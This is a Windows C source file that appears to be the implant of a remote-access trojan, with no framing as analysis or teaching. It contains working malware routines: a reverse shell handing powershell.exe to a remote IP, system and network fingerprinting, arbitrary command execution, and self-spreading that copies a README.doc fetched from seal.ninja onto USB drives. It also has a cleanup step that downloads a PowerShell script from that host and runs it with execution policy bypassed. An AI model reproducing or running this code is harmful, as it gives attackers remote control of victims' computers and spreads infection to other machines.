#include "headers.h"

void reverse_shell(NETWORK* net) {

	WSADATA wsa_data;
	SOCKET socket;
	struct sockaddr_in address;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	WSAStartup(MAKEWORD(2,2), &wsa_data);
	socket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (GROUP)NULL, (DWORD)NULL);

	address.sin_family = AF_INET;
	address.sin_port = htons(atoi(net->port));
	address.sin_addr.s_addr = inet_addr(net->ip);

	WSAConnect(socket, (SOCKADDR*)&address, sizeof(address), NULL, NULL, NULL, NULL);

	if(WSAGetLastError() == 0) {
		memset(&si, 0, sizeof(si));
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESTDHANDLES;
		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;

		CreateProcess(NULL, "powershell.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		closesocket(socket);
		WSACleanup();
	}

}

char *get_sysinfo() {

	HOST host;
	get_hostname(&host);
	get_os(&host);
	get_network_info(&host);
	return format_host(&host);
}

int get_hostname(HOST *host) {
	WORD version_requested;
	WSADATA wsa_data;
	int err;

	version_requested = MAKEWORD(2, 2);

	err = WSAStartup(version_requested, &wsa_data);
	if (err != 0) {
		return 1;
	}

	gethostname(host->name, sizeof(host->name));

	return 0;
}

void get_os(HOST *host) {
	NTSTATUS(WINAPI *RtlGetVersion)(LPOSVERSIONINFOEXW);
	OSVERSIONINFOEXW os_info;

	*(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

	if (NULL != RtlGetVersion) {
		os_info.dwOSVersionInfoSize = sizeof(os_info);
		RtlGetVersion(&os_info);
		host->os = os_info.dwMajorVersion;
	}
}

int get_network_info(HOST *host) {

	PIP_ADAPTER_INFO p_adapter_info;
	PIP_ADAPTER_INFO p_adapter = NULL;
	int ret = 0;
	int counter = 0;
	ULONG buf_len = sizeof (IP_ADAPTER_INFO);

	p_adapter_info = (IP_ADAPTER_INFO *) malloc(sizeof (IP_ADAPTER_INFO));

	if (p_adapter_info == NULL) {
		return 1;
	}

	if (GetAdaptersInfo(p_adapter_info, &buf_len) == ERROR_BUFFER_OVERFLOW) {
		free(p_adapter_info);
		p_adapter_info = (IP_ADAPTER_INFO *) malloc(buf_len);
		if (p_adapter_info == NULL) {
			return 1;
		}
	}

	if ((ret = GetAdaptersInfo(p_adapter_info, &buf_len)) == NO_ERROR) {
		p_adapter = p_adapter_info;

		while (p_adapter) {
			if (p_adapter->IpAddressList.IpAddress.String[0] != '0') {
				counter++;
			}
			p_adapter = p_adapter->Next;
		}

		host->network = malloc(counter * sizeof(NETWORK));
		host->size_network = counter;
		p_adapter = p_adapter_info;
		counter = 0;

		while (p_adapter) {
			if (p_adapter->IpAddressList.IpAddress.String[0] != '0') {
				sprintf(host->network[counter].mac, "%.2X-%.2X-%.2X-%.2X-%.2X-%.2X", p_adapter->Address[0], p_adapter->Address[1], p_adapter->Address[2], p_adapter->Address[3], p_adapter->Address[4], p_adapter->Address[5]);
				strcpy(host->network[counter].ip, p_adapter->IpAddressList.IpAddress.String);
				strcpy(host->network[counter].mask, p_adapter->IpAddressList.IpMask.String);
				strcpy(host->network[counter].gateway, p_adapter->GatewayList.IpAddress.String);
				counter++;
			}
			p_adapter = p_adapter->Next;
		}
	}
	return 0;
}

char* format_host(HOST *host) {

	int size = sizeof(host->name) + 4 + host->size_network * ( 5 + sizeof(NETWORK));
	char* sysinfo = malloc(size * sizeof(char));

	sprintf(sysinfo, "%s;", host->name);
	sprintf(sysinfo, "%s%.1lf;", sysinfo, host->os);

	for(int i=0; i<host->size_network; i++) {
		sprintf(sysinfo, "%s{%s", sysinfo, host->network[i].mac);
		sprintf(sysinfo, "%s|%s", sysinfo, host->network[i].ip);
		sprintf(sysinfo, "%s|%s", sysinfo, host->network[i].mask);
		sprintf(sysinfo, "%s|%s}", sysinfo, host->network[i].gateway);
	}

	return sysinfo;
}

char* exec(char* cmd) {
	char buffer[1024];
	char* result = NULL;

	FILE* pipe = NULL;
	pipe = _popen(cmd, "r");
	if (!pipe) {
		return NULL;
	}

	result = malloc(sizeof(char));
	result[0] = '\0';

	if (fgets(buffer, sizeof(buffer), pipe) != NULL) {
		result = realloc(result, strlen(result) + strlen(buffer) + 1);
		strcpy(result, buffer);

		while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
			result = realloc(result, strlen(result) + strlen(buffer) + 1);
			strcat(result, buffer);
		}
	}

	_pclose(pipe);
	return result;
}

void replicate(USB* usb) {
	char dest_path[50];
	char doc_path[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, 0, doc_path);
	sprintf(doc_path, "%s\\Windows\\README.doc", doc_path);

	URLDownloadToFile(NULL, "http://seal.ninja:444/r/README.doc", doc_path, 0, NULL);
	for (int i = 0; i < usb->size; i++) {
		sprintf(dest_path, "%s%s", usb->drive[i], "README.doc");
		CopyFile(doc_path, dest_path, TRUE);
	}
	DeleteFile(doc_path);
}

void scan_usb() {
	USB usb;
	char* buffer = malloc(sizeof(char) * 5);
	usb.size = 0;
	usb.drive = malloc(sizeof(char*) * (usb.size + 1));

	GetSystemDirectory(buffer, sizeof(buffer));

	lstrcpy(buffer + 1, ":\\");

	while (_scan_flag == 1) {
		for (buffer[0] = 'C'; buffer[0] <= 'Z'; buffer[0]++) {
			if (GetDriveType(buffer) == DRIVE_REMOVABLE) {
				usb.drive = realloc(usb.drive, (usb.size + 1) * (sizeof(char*)));
				usb.drive[usb.size] = malloc(sizeof(char) * 5);
				strcpy(usb.drive[usb.size], buffer);
				usb.size++;
			}
		}

		if (usb.size != 0) {
			DWORD thread_id;
			Sleep(5000);
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)replicate, &usb, 0, &thread_id);
		}

		Sleep(750);
	}
}

void frequency(int delay) {
	_delay = delay;
}

void order66() {

	char path[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path);
	strcat(path, "\\Windows\\seal.bmp");

	URLDownloadToFile(NULL, "http://seal.ninja:444/w/seal.bmp", path, 0, NULL);

	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
}

BOOL is_elevated() {
	BOOL ret = FALSE;
	HANDLE h_token = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h_token)) {
		TOKEN_ELEVATION elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(h_token, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
			ret = elevation.TokenIsElevated;
		}
	}
	if (h_token) {
		CloseHandle(h_token);
	}
	return ret;
}

void cleanup() {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	char path[MAX_PATH] = { 0 };
	char command[300] = { 0 };

	GetTempPath(MAX_PATH, path);
	strcat(path, "\\clean.ps1");

	URLDownloadToFile(NULL, "http://seal.ninja:444/c/clean.ps1", path, 0, NULL);

	sprintf(command, "powershell.exe -exec bypass %s", path);

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(NULL, command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}
